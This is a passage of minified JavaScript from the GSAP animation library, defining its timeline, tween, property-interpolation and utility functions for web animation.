t,e=this.parent||this._dp,i=this._start;return!(e&&!(this._ts&&this._initted&&e.isActive()&&(t=e.rawTime(!0))>=i&&t<this.endTime(!0)-H))},e.eventCallback=function(t,e,i){var r=this.vars;return arguments.length>1?(e?(r[t]=e,i&&(r[t+"Params"]=i),"onUpdate"===t&&(this._onUpdate=e)):delete r[t],this):r[t]},e.then=function(t){var e=this;return new Promise((function(i){var r=Z(t)?t:Ut,n=function(){var t=e.then;e.then=null,Z(r)&&(r=r(e))&&(r.then||r===e)&&(e.then=t),i(r),e.then=t};e._initted&&1===e.totalProgress()&&e._ts>=0||!e._tTime&&e._ts<0?n():e._prom=n}))},e.kill=function(){Ce(this)},t}();kt(Je.prototype,{_time:0,_start:0,_end:0,_tTime:0,_tDur:0,_dirty:0,_repeat:0,_yoyo:!1,parent:null,_initted:!1,_rDelay:0,_ts:1,_dp:0,ratio:0,_zTime:-1e-8,_prom:0,_ps:!1,_rts:1});var ti=function(t){function e(e,i){var r;return void 0===e&&(e={}),(r=t.call(this,e)||this).labels={},r.smoothChildTiming=!!e.smoothChildTiming,r.autoRemoveChildren=!!e.autoRemoveChildren,r._sort=tt(e.sortChildren),S&&ie(e.parent||S,T(r),i),e.reversed&&r.reverse(),e.paused&&r.paused(!0),e.scrollTrigger&&re(T(r),e.scrollTrigger),r}D(e,t);var i=e.prototype;return i.to=function(t,e,i){return ce(0,arguments,this),this},i.from=function(t,e,i){return ce(1,arguments,this),this},i.fromTo=function(t,e,i,r){return ce(2,arguments,this),this},i.set=function(t,e,i){return e.duration=0,e.parent=this,Vt(e).repeatDelay||(e.repeat=0),e.immediateRender=!!e.immediateRender,new ci(t,e,le(this,i),1),this},i.call=function(t,e,i){return ie(this,ci.delayedCall(0,t,e),i)},i.staggerTo=function(t,e,i,r,n,s,o){return i.duration=e,i.stagger=i.stagger||r,i.onComplete=s,i.onCompleteParams=o,i.parent=this,new ci(t,i,le(this,n)),this},i.staggerFrom=function(t,e,i,r,n,s,o){return i.runBackwards=1,Vt(i).immediateRender=tt(i.immediateRender),this.staggerTo(t,e,i,r,n,s,o)},i.staggerFromTo=function(t,e,i,r,n,s,o,a){return r.startAt=i,Vt(r).immediateRender=tt(r.immediateRender),this.staggerTo(t,e,r,n,s,o,a)},i.render=function(t,e,i){var r,n,s,o,a,h,u,l,c,d,p,f,g=this._time,m=this._dirty?this.totalDuration():this._tDur,v=this._dur,_=t<=0?0:Ot(t),y=this._zTime<0!=t<0&&(this._initted||!v);if(this!==S&&_>m&&t>=0&&(_=m),_!==this._tTime||i||y){if(g!==this._time&&v&&(_+=this._time-g,t+=this._time-g),r=_,c=this._start,h=!(l=this._ts),y&&(v||(g=this._zTime),(t||!e)&&(this._zTime=t)),this._repeat){if(p=this._yoyo,a=v+this._rDelay,this._repeat<-1&&t<0)return this.totalTime(100*a+t,e,i);if(r=Ot(_%a),_===m?(o=this._repeat,r=v):((o=~~(_/a))&&o===_/a&&(r=v,o--),r>v&&(r=v)),d=Kt(this._tTime,a),!g&&this._tTime&&d!==o&&(d=o),p&&1&o&&(r=v-r,f=1),o!==d&&!this._lock){var x=p&&1&d,E=x===(p&&1&o);if(o<d&&(x=!x),g=x?0:v,this._lock=1,this.render(g||(f?0:Ot(o*a)),e,!v)._lock=0,this._tTime=_,!e&&this.parent&&Ae(this,"onRepeat"),this.vars.repeatRefresh&&!f&&(this.invalidate()._lock=1),g&&g!==this._time||h!==!this._ts||this.vars.onRepeat&&!this.parent&&!this._act)return this;if(v=this._dur,m=this._tDur,E&&(this._lock=2,g=x?v:-1e-4,this.render(g,!0),this.vars.repeatRefresh&&!f&&this.invalidate()),this._lock=0,!this._ts&&!h)return this;$e(this,f)}}if(this._hasPause&&!this._forcing&&this._lock<2&&((u=function(t,e,i){var r;if(i>e)for(r=t._first;r&&r._start<=i;){if("isPause"===r.data&&r._start>e)return r;r=r._next}else for(r=t._last;r&&r._start>=i;){if("isPause"===r.data&&r._start<e)return r;r=r._prev}}(this,Ot(g),Ot(r)))&&(_-=r-(r=u._start))),this._tTime=_,this._time=r,this._act=!l,this._initted||(this._onUpdate=this.vars.onUpdate,this._initted=1,this._zTime=t,g=0),!g&&r&&!e&&(Ae(this,"onStart"),this._tTime!==_))return this;if(r>=g&&t>=0)for(n=this._first;n;){if(s=n._next,(n._act||r>=n._start)&&n._ts&&u!==n){if(n.parent!==this)return this.render(t,e,i);if(n.render(n._ts>0?(r-n._start)*n._ts:(n._dirty?n.totalDuration():n._tDur)+(r-n._start)*n._ts,e,i),r!==this._time||!this._ts&&!h){u=0,s&&(_+=this._zTime=-1e-8);break}}n=s}else{n=this._last;for(var b=t<0?t:r;n;){if(s=n._prev,(n._act||b<=n._end)&&n._ts&&u!==n){if(n.parent!==this)return this.render(t,e,i);if(n.render(n._ts>0?(b-n._start)*n._ts:(n._dirty?n.totalDuration():n._tDur)+(b-n._start)*n._ts,e,i),r!==this._time||!this._ts&&!h){u=0,s&&(_+=this._zTime=b?-1e-8:H);break}}n=s}}if(u&&!e&&(this.pause(),u.render(r>=g?0:-1e-8)._zTime=r>=g?1:-1,this._ts))return this._start=c,Jt(this),this.render(t,e,i);this._onUpdate&&!e&&Ae(this,"onUpdate",!0),(_===m&&this._tTime>=this.totalDuration()||!_&&g)&&(c!==this._start&&Math.abs(l)===Math.abs(this._ts)||this._lock||((t||!v)&&(_===m&&this._ts>0||!_&&this._ts<0)&&$t(this,1),e||t<0&&!g||!_&&!g&&m||(Ae(this,_===m&&t>=0?"onComplete":"onReverseComplete",!0),this._prom&&!(_<m&&this.timeScale()>0)&&this._prom())))}return this},i.add=function(t,e){var i=this;if(K(e)||(e=le(this,e,t)),!(t instanceof Je)){if(nt(t))return t.forEach((function(t){return i.add(t,e)})),this;if(q(t))return this.addLabel(t,e);if(!Z(t))return this;t=ci.delayedCall(0,t)}return this!==t?ie(this,t,e):this},i.getChildren=function(t,e,i,r){void 0===t&&(t=!0),void 0===e&&(e=!0),void 0===i&&(i=!0),void 0===r&&(r=-G);for(var n=[],s=this._first;s;)s._start>=r&&(s instanceof ci?e&&n.push(s):(i&&n.push(s),t&&n.push.apply(n,s.getChildren(!0,e,i)))),s=s._next;return n},i.getById=function(t){for(var e=this.getChildren(1,1,1),i=e.length;i--;)if(e[i].vars.id===t)return e[i]},i.remove=function(t){return q(t)?this.removeLabel(t):Z(t)?this.killTweensOf(t):(jt(this,t),t===this._recent&&(this._recent=this._last),Wt(this))},i.totalTime=function(e,i){return arguments.length?(this._forcing=1,!this._dp&&this._ts&&(this._start=Ot(ke.time-(this._ts>0?e/this._ts:(this.totalDuration()-e)/-this._ts))),t.prototype.totalTime.call(this,e,i),this._forcing=0,this):this._tTime},i.addLabel=function(t,e){return this.labels[t]=le(this,e),this},i.removeLabel=function(t){return delete this.labels[t],this},i.addPause=function(t,e,i){var r=ci.delayedCall(0,e||_t,i);return r.data="isPause",this._hasPause=1,ie(this,r,le(this,t))},i.removePause=function(t){var e=this._first;for(t=le(this,t);e;)e._start===t&&"isPause"===e.data&&$t(e),e=e._next},i.killTweensOf=function(t,e,i){for(var r=this.getTweensOf(t,i),n=r.length;n--;)ei!==r[n]&&r[n].kill(t,e);return this},i.getTweensOf=function(t,e){for(var i,r=[],n=ve(t),s=this._first,o=K(e);s;)s instanceof ci?Mt(s._targets,n)&&(o?(!ei||s._initted&&s._ts)&&s.globalTime(0)<=e&&s.globalTime(s.totalDuration())>e:!e||s.isActive())&&r.push(s):(i=s.getTweensOf(n,e)).length&&r.push.apply(r,i),s=s._next;return r},i.tweenTo=function(t,e){e=e||{};var i,r=this,n=le(r,t),s=e,o=s.startAt,a=s.onStart,h=s.onStartParams,u=s.immediateRender,l=ci.to(r,kt({ease:e.ease||"none",lazy:!1,immediateRender:!1,time:n,overwrite:"auto",duration:e.duration||Math.abs((n-(o&&"time"in o?o.time:r._time))/r.timeScale())||H,onStart:function(){if(r.pause(),!i){var t=e.duration||Math.abs((n-(o&&"time"in o?o.time:r._time))/r.timeScale());l._dur!==t&&ae(l,t,0,1).render(l._time,!0,!0),i=1}a&&a.apply(l,h||[])}},e));return u?l.render(0):l},i.tweenFromTo=function(t,e,i){return this.tweenTo(e,kt({startAt:{time:le(this,t)}},i))},i.recent=function(){return this._recent},i.nextLabel=function(t){return void 0===t&&(t=this._time),Se(this,le(this,t))},i.previousLabel=function(t){return void 0===t&&(t=this._time),Se(this,le(this,t),1)},i.currentLabel=function(t){return arguments.length?this.seek(t,!0):this.previousLabel(this._time+H)},i.shiftChildren=function(t,e,i){void 0===i&&(i=0);for(var r,n=this._first,s=this.labels;n;)n._start>=i&&(n._start+=t,n._end+=t),n=n._next;if(e)for(r in s)s[r]>=i&&(s[r]+=t);return Wt(this)},i.invalidate=function(){var e=this._first;for(this._lock=0;e;)e.invalidate(),e=e._next;return t.prototype.invalidate.call(this)},i.clear=function(t){void 0===t&&(t=!0);for(var e,i=this._first;i;)e=i._next,this.remove(i),i=e;return this._dp&&(this._time=this._tTime=this._pTime=0),t&&(this.labels={}),Wt(this)},i.totalDuration=function(t){var e,i,r,n=0,s=this,o=s._last,a=G;if(arguments.length)return s.timeScale((s._repeat<0?s.duration():s.totalDuration())/(s.reversed()?-t:t));if(s._dirty){for(r=s.parent;o;)e=o._prev,o._dirty&&o.totalDuration(),(i=o._start)>a&&s._sort&&o._ts&&!s._lock?(s._lock=1,ie(s,o,i-o._delay,1)._lock=0):a=i,i<0&&o._ts&&(n-=i,(!r&&!s._dp||r&&r.smoothChildTiming)&&(s._start+=i/s._ts,s._time-=i,s._tTime-=i),s.shiftChildren(-i,!1,-1/0),a=0),o._end>n&&o._ts&&(n=o._end),o=e;ae(s,s===S&&s._time>n?s._time:n,1,1),s._dirty=0}return s._tDur},e.updateRoot=function(t){if(S._ts&&(Lt(S,Qt(t,S)),P=ke.frame),ke.frame>=Dt){Dt+=U.autoSleep||120;var e=S._first;if((!e||!e._ts)&&U.autoSleep&&ke._listeners.length<2){for(;e&&!e._ts;)e=e._next;e||ke.sleep()}}},e}(Je);kt(ti.prototype,{_lock:0,_hasPause:0,_forcing:0});var ei,ii,ri=function(t,e,i,r,n,s,o){var a,h,u,l,c,d,p,f,g=new wi(this._pt,t,e,0,1,yi,null,n),m=0,v=0;for(g.b=i,g.e=r,i+="",(p=~(r+="").indexOf("random("))&&(r=De(r)),s&&(s(f=[i,r],t,e),i=f[0],r=f[1]),h=i.match(ht)||[];a=ht.exec(r);)l=a[0],c=r.substring(m,a.index),u?u=(u+1)%5:"rgba("===c.substr(-5)&&(u=1),l!==h[v++]&&(d=parseFloat(h[v-1])||0,g._pt={_next:g._pt,p:c||1===v?c:",",s:d,c:"="===l.charAt(1)?Nt(d,l)-d:parseFloat(l)-d,m:u&&u<4?Math.round:0},m=ht.lastIndex);return g.c=m<r.length?r.substring(m,r.length):"",g.fp=o,(ut.test(r)||p)&&(g.e=0),this._pt=g,g},ni=function(t,e,i,r,n,s,o,a,h){Z(r)&&(r=r(n||0,t,s));var u,l=t[e],c="get"!==i?i:Z(l)?h?t[e.indexOf("set")||!Z(t["get"+e.substr(3)])?e:"get"+e.substr(3)](h):t[e]():l,d=Z(l)?h?fi:pi:di;if(q(r)&&(~r.indexOf("random(")&&(r=De(r)),"="===r.charAt(1)&&((u=Nt(c,r)+(fe(c)||0))||0===u)&&(r=u)),c!==r||ii)return isNaN(c*r)||""===r?(!l&&!(e in t)&&gt(e,r),ri.call(this,t,e,c,r,d,a||U.stringFilter,h)):(u=new wi(this._pt,t,e,+c||0,r-(c||0),"boolean"==typeof l?_i:vi,0,d),h&&(u.fp=h),o&&u.modifier(o,this,t),this._pt=u)},si=function(t,e,i,r,n,s){var o,a,h,u;if(bt[t]&&!1!==(o=new bt[t]).init(n,o.rawVars?e[t]:function(t,e,i,r,n){if(Z(t)&&(t=hi(t,n,e,i,r)),!J(t)||t.style&&t.nodeType||nt(t)||rt(t))return q(t)?hi(t,n,e,i,r):t;var s,o={};for(s in t)o[s]=hi(t[s],n,e,i,r);return o}(e[t],r,n,s,i),i,r,s)&&(i._pt=a=new wi(i._pt,n,t,0,1,o.render,o,0,o.priority),i!==O))for(h=i._ptLookup[i._targets.indexOf(n)],u=o._props.length;u--;)h[o._props[u]]=a;return o},oi=function t(e,i){var r,n,s,o,a,h,u,l,c,d,p,f,g,m=e.vars,v=m.ease,_=m.startAt,y=m.immediateRender,x=m.lazy,E=m.onUpdate,b=m.onUpdateParams,T=m.callbackScope,D=m.runBackwards,A=m.yoyoEase,C=m.keyframes,I=m.autoRevert,R=e._dur,P=e._startAt,O=e._targets,N=e.parent,M=N&&"nested"===N.data?N.parent._targets:O,F="auto"===e._overwrite&&!w,L=e.timeline;if(L&&(!C||!v)&&(v="none"),e._ease=We(v,k.ease),e._yEase=A?je(We(!0===A?v:A,k.ease)):0,A&&e._yoyo&&!e._repeat&&(A=e._yEase,e._yEase=e._ease,e._ease=A),e._from=!L&&!!m.runBackwards,!L||C&&!m.stagger){if(f=(l=O[0]?Ct(O[0]).harness:0)&&m[l.prop],r=zt(m,yt),P&&($t(P.render(-1,!0)),P._lazy=0),_)if($t(e._startAt=ci.set(O,kt({data:"isStart",overwrite:!1,parent:N,immediateRender:!0,lazy:tt(x),startAt:null,delay:0,onUpdate:E,onUpdateParams:b,callbackScope:T,stagger:0},_))),i<0&&!y&&!I&&e._startAt.render(-1,!0),y){if(i>0&&!I&&(e._startAt=0),R&&i<=0)return void(i&&(e._zTime=i))}else!1===I&&(e._startAt=0);else if(D&&R)if(P)!I&&(e._startAt=0);else if(i&&(y=!1),s=kt({overwrite:!1,data:"isFromStart",lazy:y&&tt(x),immediateRender:y,stagger:0,parent:N},r),f&&(s[l.prop]=f),$t(e._startAt=ci.set(O,s)),i<0&&e._startAt.render(-1,!0),e._zTime=i,y){if(!i)return}else t(e._startAt,H);for(e._pt=e._ptCache=0,x=R&&tt(x)||x&&!R,n=0;n<O.length;n++){if(u=(a=O[n])._gsap||At(O)[n]._gsap,e._ptLookup[n]=d={},Et[u.id]&&xt.length&&Ft(),p=M===O?n:M.indexOf(a),l&&!1!==(c=new l).init(a,f||r,e,p,M)&&(e._pt=o=new wi(e._pt,a,c.name,0,1,c.render,c,0,c.priority),c._props.forEach((function(t){d[t]=o})),c.priority&&(h=1)),!l||f)for(s in r)bt[s]&&(c=si(s,r,e,p,a,M))?c.priority&&(h=1):d[s]=o=ni.call(e,a,s,"get",r[s],p,M,0,m.stringFilter);e._op&&e._op[n]&&e.kill(a,e._op[n]),F&&e._pt&&(ei=e,S.killTweensOf(a,d,e.globalTime(i)),g=!e.parent,ei=0),e._pt&&x&&(Et[u.id]=1)}h&&Di(e),e._onInit&&e._onInit(e)}e._onUpdate=E,e._initted=(!e._op||e._pt)&&!g,C&&i<=0&&L.render(G,!0,!0)},ai=function(t,e,i,r){var n,s,o=e.ease||r||"power1.inOut";if(nt(e))s=i[t]||(i[t]=[]),e.forEach((function(t,i){return s.push({t:i/(e.length-1)*100,v:t,e:o})}));else for(n in e)s=i[n]||(i[n]=[]),"ease"===n||s.push({t:parseFloat(t),v:e[n],e:o})},hi=function(t,e,i,r,n){return Z(t)?t.call(e,i,r,n):q(t)&&~t.indexOf("random(")?De(t):t},ui=St+"repeat,repeatDelay,yoyo,repeatRefresh,yoyoEase,autoRevert",li={};Rt(ui+",id,stagger,delay,duration,paused,scrollTrigger",(function(t){return li[t]=1}));var ci=function(t){function e(e,i,r,n){var s;"number"==typeof i&&(r.duration=i,i=r,r=null);var o,a,h,u,l,c,d,p,f=(s=t.call(this,n?i:Vt(i))||this).vars,g=f.duration,m=f.delay,v=f.immediateRender,_=f.stagger,y=f.overwrite,x=f.keyframes,E=f.defaults,b=f.scrollTrigger,D=f.yoyoEase,A=i.parent||S,C=(nt(e)||rt(e)?K(e[0]):"length"in i)?[e]:ve(e);if(s._targets=C.length?At(C):mt("GSAP target "+e+" not found. https://greensock.com",!U.nullTargetWarn)||[],s._ptLookup=[],s._overwrite=y,x||_||it(g)||it(m)){if(i=s.vars,(o=s.timeline=new ti({data:"nested",defaults:E||{}})).kill(),o.parent=o._dp=T(s),o._start=0,_||it(g)||it(m)){if(u=C.length,d=_&&ye(_),J(_))for(l in _)~ui.indexOf(l)&&(p||(p={}),p[l]=_[l]);for(a=0;a<u;a++)(h=zt(i,li)).stagger=0,D&&(h.yoyoEase=D),p&&Gt(h,p),c=C[a],h.duration=+hi(g,T(s),a,c,C),h.delay=(+hi(m,T(s),a,c,C)||0)-s._delay,!_&&1===u&&h.delay&&(s._delay=m=h.delay,s._start+=m,h.delay=0),o.to(c,h,d?d(a,c,C):0),o._ease=He.none;o.duration()?g=m=0:s.timeline=0}else if(x){Vt(kt(o.vars.defaults,{ease:"none"})),o._ease=We(x.ease||i.ease||"none");var I,R,P,O=0;if(nt(x))x.forEach((function(t){return o.to(C,t,">")}));else{for(l in h={},x)"ease"===l||"easeEach"===l||ai(l,x[l],h,x.easeEach);for(l in h)for(I=h[l].sort((function(t,e){return t.t-e.t})),O=0,a=0;a<I.length;a++)(P={ease:(R=I[a]).e,duration:(R.t-(a?I[a-1].t:0))/100*g})[l]=R.v,o.to(C,P,O),O+=P.duration;o.duration()<g&&o.to({},{duration:g-o.duration()})}}g||s.duration(g=o.duration())}else s.timeline=0;return!0!==y||w||(ei=T(s),S.killTweensOf(C),ei=0),ie(A,T(s),r),i.reversed&&s.reverse(),i.paused&&s.paused(!0),(v||!g&&!x&&s._start===Ot(A._time)&&tt(v)&&qt(T(s))&&"nested"!==A.data)&&(s._tTime=-1e-8,s.render(Math.max(0,-m))),b&&re(T(s),b),s}D(e,t);var i=e.prototype;return i.render=function(t,e,i){var r,n,s,o,a,h,u,l,c,d=this._time,p=this._tDur,f=this._dur,g=t>p-H&&t>=0?p:t<H?0:t;if(f){if(g!==this._tTime||!t||i||!this._initted&&this._tTime||this._startAt&&this._zTime<0!=t<0){if(r=g,l=this.timeline,this._repeat){if(o=f+this._rDelay,this._repeat<-1&&t<0)return this.totalTime(100*o+t,e,i);if(r=Ot(g%o),g===p?(s=this._repeat,r=f):((s=~~(g/o))&&s===g/o&&(r=f,s--),r>f&&(r=f)),(h=this._yoyo&&1&s)&&(c=this._yEase,r=f-r),a=Kt(this._tTime,o),r===d&&!i&&this._initted)return this._tTime=g,this;s!==a&&(l&&this._yEase&&$e(l,h),!this.vars.repeatRefresh||h||this._lock||(this._lock=i=1,this.render(Ot(o*s),!0).invalidate()._lock=0))}if(!this._initted){if(ne(this,t<0?t:r,i,e))return this._tTime=0,this;if(d!==this._time)return this;if(f!==this._dur)return this.render(t,e,i)}if(this._tTime=g,this._time=r,!this._act&&this._ts&&(this._act=1,this._lazy=0),this.ratio=u=(c||this._ease)(r/f),this._from&&(this.ratio=u=1-u),r&&!d&&!e&&(Ae(this,"onStart"),this._tTime!==g))return this;for(n=this._pt;n;)n.r(u,n.d),n=n._next;l&&l.render(t<0?t:!r&&h?-1e-8:l._dur*l._ease(r/this._dur),e,i)||this._startAt&&(this._zTime=t),this._onUpdate&&!e&&(t<0&&this._startAt&&this._startAt.render(t,!0,i),Ae(this,"onUpdate")),this._repeat&&s!==a&&this.vars.onRepeat&&!e&&this.parent&&Ae(this,"onRepeat"),g!==this._tDur&&g||this._tTime!==g||(t<0&&this._startAt&&!this._onUpdate&&this._startAt.render(t,!0,!0),(t||!f)&&(g===this._tDur&&this._ts>0||!g&&this._ts<0)&&$t(this,1),e||t<0&&!d||!g&&!d||(Ae(this,g===p?"onComplete":"onReverseComplete",!0),this._prom&&!(g<p&&this.timeScale()>0)&&this._prom()))}}else!function(t,e,i,r){var n,s,o,a=t.ratio,h=e<0||!e&&(!t._start&&se(t)&&(t._initted||!oe(t))||(t._ts<0||t._dp._ts<0)&&!oe(t))?0:1,u=t._rDelay,l=0;if(u&&t._repeat&&(l=pe(0,t._tDur,e),s=Kt(l,u),t._yoyo&&1&s&&(h=1-h),s!==Kt(t._tTime,u)&&(a=1-h,t.vars.repeatRefresh&&t._initted&&t.invalidate())),h!==a||r||t._zTime===H||!e&&t._zTime){if(!t._initted&&ne(t,e,r,i))return;for(o=t._zTime,t._zTime=e||(i?H:0),i||(i=e&&!o),t.ratio=h,t._from&&(h=1-h),t._time=0,t._tTime=l,n=t._pt;n;)n.r(h,n.d),n=n._next;t._startAt&&e<0&&t._startAt.render(e,!0,!0),t._onUpdate&&!i&&Ae(t,"onUpdate"),l&&t._repeat&&!i&&t.parent&&Ae(t,"onRepeat"),(e>=t._tDur||e<0)&&t.ratio===h&&(h&&$t(t,1),i||(Ae(t,h?"onComplete":"onReverseComplete",!0),t._prom&&t._prom()))}else t._zTime||(t._zTime=e)}(this,t,e,i);return this},i.targets=function(){return this._targets},i.invalidate=function(){return this._pt=this._op=this._startAt=this._onUpdate=this._lazy=this.ratio=0,this._ptLookup=[],this.timeline&&this.timeline.invalidate(),t.prototype.invalidate.call(this)},i.resetTo=function(t,e,i,r){N||ke.wake(),this._ts||this.play();var n=Math.min(this._dur,(this._dp._time-this._start)*this._ts);return this._initted||oi(this,n),function(t,e,i,r,n,s,o){var a,h,u,l=(t._pt&&t._ptCache||(t._ptCache={}))[e];if(!l)for(l=t._ptCache[e]=[],h=t._ptLookup,u=t._targets.length;u--;){if((a=h[u][e])&&a.d&&a.d._pt)for(a=a.d._pt;a&&a.p!==e;)a=a._next;if(!a)return ii=1,t.vars[e]="+=0",oi(t,o),ii=0,1;l.push(a)}for(u=l.length;u--;)(a=l[u]).s=!r&&0!==r||n?a.s+(r||0)+s*a.c:r,a.c=i-a.s,a.e&&(a.e=Pt(i)+fe(a.e)),a.b&&(a.b=a.s+fe(a.b))}(this,t,e,i,r,this._ease(n/this._dur),n)?this.resetTo(t,e,i,r):(te(this,0),this.parent||Xt(this._dp,this,"_first","_last",this._dp._sort?"_start":0),this.render(0))},i.kill=function(t,e){if(void 0===e&&(e="all"),!(t||e&&"all"!==e))return this._lazy=this._pt=0,this.parent?Ce(this):this;if(this.timeline){var i=this.timeline.totalDuration();return this.timeline.killTweensOf(t,e,ei&&!0!==ei.vars.overwrite)._first||Ce(this),this.parent&&i!==this.timeline.totalDuration()&&ae(this,this._dur*this.timeline._tDur/i,0,1),this}var r,n,s,o,a,h,u,l=this._targets,c=t?ve(t):l,d=this._ptLookup,p=this._pt;if((!e||"all"===e)&&function(t,e){for(var i=t.length,r=i===e.length;r&&i--&&t[i]===e[i];);return i<0}(l,c))return"all"===e&&(this._pt=0),Ce(this);for(r=this._op=this._op||[],"all"!==e&&(q(e)&&(a={},Rt(e,(function(t){return a[t]=1})),e=a),e=function(t,e){var i,r,n,s,o=t[0]?Ct(t[0]).harness:0,a=o&&o.aliases;if(!a)return e;for(r in i=Gt({},e),a)if(r in i)for(n=(s=a[r].split(",")).length;n--;)i[s[n]]=i[r];return i}(l,e)),u=l.length;u--;)if(~c.indexOf(l[u]))for(a in n=d[u],"all"===e?(r[u]=e,o=n,s={}):(s=r[u]=r[u]||{},o=e),o)(h=n&&n[a])&&("kill"in h.d&&!0!==h.d.kill(a)||jt(this,h,"_pt"),delete n[a]),"all"!==s&&(s[a]=1);return this._initted&&!this._pt&&p&&Ce(this),this},e.to=function(t,i){return new e(t,i,arguments[2])},e.from=function(t,e){return ce(1,arguments)},e.delayedCall=function(t,i,r,n){return new e(i,0,{immediateRender:!1,lazy:!1,overwrite:!1,delay:t,onComplete:i,onReverseComplete:i,onCompleteParams:r,onReverseCompleteParams:r,callbackScope:n})},e.fromTo=function(t,e,i){return ce(2,arguments)},e.set=function(t,i){return i.duration=0,i.repeatDelay||(i.repeat=0),new e(t,i)},e.killTweensOf=function(t,e,i){return S.killTweensOf(t,e,i)},e}(Je);kt(ci.prototype,{_targets:[],_lazy:0,_startAt:0,_op:0,_onInit:0}),Rt("staggerTo,staggerFrom,staggerFromTo",(function(t){ci[t]=function(){var e=new ti,i=ge.call(arguments,0);return i.splice("staggerFromTo"===t?5:4,0,0),e[t].apply(e,i)}}));var di=function(t,e,i){return t[e]=i},pi=function(t,e,i){return t[e](i)},fi=function(t,e,i,r){return t[e](r.fp,i)},gi=function(t,e,i){return t.setAttribute(e,i)},mi=function(t,e){return Z(t[e])?pi:Q(t[e])&&t.setAttribute?gi:di},vi=function(t,e){return e.set(e.t,e.p,Math.round(1e6*(e.s+e.c*t))/1e6,e)},_i=function(t,e){return e.set(e.t,e.p,!!(e.s+e.c*t),e)},yi=function(t,e){var i=e._pt,r="";if(!t&&e.b)r=e.b;else if(1===t&&e.e)r=e.e;else{for(;i;)r=i.p+(i.m?i.m(i.s+i.c*t):Math.round(1e4*(i.s+i.c*t))/1e4)+r,i=i._next;r+=e.c}e.set(e.t,e.p,r,e)},xi=function(t,e){for(var i=e._pt;i;)i.r(t,i.d),i=i._next},Ei=function(t,e,i,r){for(var n,s=this._pt;s;)n=s._next,s.p===r&&s.modifier(t,e,i),s=n},bi=function(t){for(var e,i,r=this._pt;r;)i=r._next,r.p===t&&!r.op||r.op===t?jt(this,r,"_pt"):r.dep||(e=1),r=i;return!e},Ti=function(t,e,i,r){r.mSet(t,e,r.m.call(r.tween,i,r.mt),r)},Di=function(t){for(var e,i,r,n,s=t._pt;s;){for(e=s._next,i=r;i&&i.pr>s.pr;)i=i._next;(s._prev=i?i._prev:n)?s._prev._next=s:r=s,(s._next=i)?i._prev=s:n=s,s=e}t._pt=r},wi=function(){function t(t,e,i,r,n,s,o,a,h){this.t=e,this.s=r,this.c=n,this.p=i,this.r=s||vi,this.d=o||this,this.set=a||di,this.pr=h||0,this._next=t,t&&(t._prev=this)}return t.prototype.modifier=function(t,e,i){this.mSet=this.mSet||this.set,this.set=Ti,this.m=t,this.mt=i,this.tween=e},t}();Rt(St+"parent,duration,ease,delay,overwrite,runBackwards,startAt,yoyo,immediateRender,repeat,repeatDelay,data,paused,reversed,lazy,callbackScope,stringFilter,id,yoyoEase,stagger,inherit,repeatRefresh,keyframes,autoRevert,scrollTrigger",(function(t){return yt[t]=1})),dt.TweenMax=dt.TweenLite=ci,dt.TimelineLite=dt.TimelineMax=ti,S=new ti({sortChildren:!1,defaults:k,autoRemoveChildren:!0,id:"root",smoothChildTiming:!0}),U.stringFilter=Ue;var Si={registerPlugin:function(){for(var t=arguments.length,e=new Array(t),i=0;i<t;i++)e[i]=arguments[i];e.forEach((function(t){return Ie(t)}))},timeline:function(t){return new ti(t)},getTweensOf:function(t,e){return S.getTweensOf(t,e)},getProperty:function(t,e,i,r){q(t)&&(t=ve(t)[0]);var n=Ct(t||{}).get,s=i?Ut:Bt;return"native"===i&&(i=""),t?e?s((bt[e]&&bt[e].get||n)(t,e,i,r)):function(e,i,r){return s((bt[e]&&bt[e].get||n)(t,e,i,r))}:t},quickSetter:function(t,e,i){if((t=ve(t)).length>1){var r=t.map((function(t){return Ii.quickSetter(t,e,i)})),n=r.length;return function(t){for(var e=n;e--;)r[e](t)}}t=t[0]||{};var s=bt[e],o=Ct(t),a=o.harness&&(o.harness.aliases||{})[e]||e,h=s?function(e){var r=new s;O._pt=0,r.init(t,i?e+i:e,O,0,[t]),r.render(1,r),O._pt&&xi(1,O)}:o.set(t,a);return s?h:function(e){return h(t,a,i?e+i:e,o,1)}},quickTo:function(t,e,i){var r,n=Ii.to(t,Gt(((r={})[e]="+=0.1",r.paused=!0,r),i||{})),s=function(t,i,r){return n.resetTo(e,t,i,r)};return s.tween=n,s},isTweening:function(t){return S.getTweensOf(t,!0).length>0},defaults:function(t){return t&&t.ease&&(t.ease=We(t.ease,k.ease)),Ht(k,t||{})},config:function(t){return Ht(U,t||{})},registerEffect:function(t){var e=t.name,i=t.effect,r=t.plugins,n=t.defaults,s=t.extendTimeline;(r||"").split(",").forEach((function(t){return t&&!bt[t]&&!dt[t]&&mt(e+" effect requires "+t+" plugin.")})),Tt[e]=function(t,e,r){return i(ve(t),kt(e||{},n),r)},s&&(ti.prototype[e]=function(t,i,r){return this.add(Tt[e](t,J(i)?i:(r=i)&&{},this),r)})},registerEase:function(t,e){He[t]=We(e)},parseEase:function(t,e){return arguments.length?We(t,e):He},getById:function(t){return S.getById(t)},exportRoot:function(t,e){void 0===t&&(t={});var i,r,n=new ti(t);for(n.smoothChildTiming=tt(t.smoothChildTiming),S.remove(n),n._dp=0,n._time=n._tTime=S._time,i=S._first;i;)r=i._next,!e&&!i._dur&&i instanceof ci&&i.vars.onComplete===i._targets[0]||ie(n,i,i._start-i._delay),i=r;return ie(S,n,0),n},utils:{wrap:function t(e,i,r){var n=i-e;return nt(e)?Te(e,t(0,e.length),i):de(r,(function(t){return(n+(t-e)%n)%n+e}))},wrapYoyo:function t(e,i,r){var n=i-e,s=2*n;return nt(e)?Te(e,t(0,e.length-1),i):de(r,(function(t){return e+((t=(s+(t-e)%s)%s||0)>n?s-t:t)}))},distribute:ye,random:be,snap:Ee,normalize:function(t,e,i){return we(t,e,0,1,i)},getUnit:fe,clamp:function(t,e,i){return de(i,(function(i){return pe(t,e,i)}))},splitColor:Ne,toArray:ve,selector:function(t){return t=ve(t)[0]||mt("Invalid scope")||{},function(e){var i=t.current||t.nativeElement||t;return ve(e,i.querySelectorAll?i:i===t?mt("Invalid scope")||I.createElement("div"):t)}},mapRange:we,pipe:function(){for(var t=arguments.length,e=new Array(t),i=0;i<t;i++)e[i]=arguments[i];return function(t){return e.reduce((function(t,e){return e(t)}),t)}},unitize:function(t,e){return function(i){return t(parseFloat(i))+(e||fe(i))}},interpolate:function t(e,i,r,n){var s=isNaN(e+i)?0:function(t){return(1-t)*e+t*i};if(!s){var o,a,h,u,l,c=q(e),d={};if(!0===r&&(n=1)&&(r=null),c)e={p:e},i={p:i};else 